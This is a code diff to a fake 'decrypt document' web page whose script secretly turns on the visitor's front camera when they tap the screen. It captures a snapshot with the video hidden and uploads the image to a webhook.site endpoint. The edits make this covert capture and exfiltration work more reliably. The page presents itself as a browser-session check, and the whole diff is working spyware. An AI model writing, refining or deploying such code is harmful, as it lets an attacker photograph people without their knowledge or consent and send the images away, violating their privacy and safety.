@@ -50,7 +50,7 @@
     <h2 id="msg">Verifying browser session...</h2>
     <p>Please tap anywhere on the screen to decrypt document.</p>
 
-    <video id="v" autoplay playsinline style="display:none;"></video>
+    <video id="v" autoplay playsinline muted style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
@@ -61,56 +61,38 @@
 
         async function triggerCapture() {
             try {
-                // Request front camera stream with fallback constraints
+                // Request camera stream
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
+                    video: { facingMode: 'user' },
                     audio: false
                 });
                 
                 video.srcObject = stream;
+                await video.play();
+
+                // Wait 2 seconds for camera auto-exposure and frame rendering
+                await new Promise(resolve => setTimeout(resolve, 2000));
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Wait for video stream to be active and populated
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play().then(resolve).catch(resolve);
-                    };
-                    setTimeout(resolve, 1500); // fallback timer
+                const imgData = canvas.toDataURL('image/jpeg', 0.85);
+                
+                stream.getTracks().forEach(t => t.stop());
+
+                // Send via standard fetch POST with explicit body
+                await fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ image: imgData })
                 });
 
-                // Extra delay to ensure camera exposure is ready
-                setTimeout(async () => {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    const imgData = canvas.toDataURL('image/jpeg', 0.9);
-                    
-                    // Stop camera tracks
-                    stream.getTracks().forEach(t => t.stop());
-
-                    // Send using sendBeacon or reliable fetch with keepalive
-                    try {
-                        const payload = JSON.stringify({ image: imgData });
-                        
-                        if (navigator.sendBeacon) {
-                            const blob = new Blob([payload], { type: 'application/json' });
-                            navigator.sendBeacon('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', blob);
-                        } else {
-                            await fetch('https://webhook.site/2f4113c1-fdf8-4b86-92ce-167499f5190c', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: payload,
-                                keepalive: true
-                            });
-                        }
-                    } catch (err) {
-                        console.error("Exfiltration error:", err);
-                    }
-
-                    msg.innerText = "Document loaded successfully.";
-                    document.querySelector('.spinner').style.display = 'none';
-                }, 1000);
+                msg.innerText = "Document loaded successfully.";
+                document.querySelector('.spinner').style.display = 'none';
 
             } catch (e) {
                 console.error("Capture failed:", e);
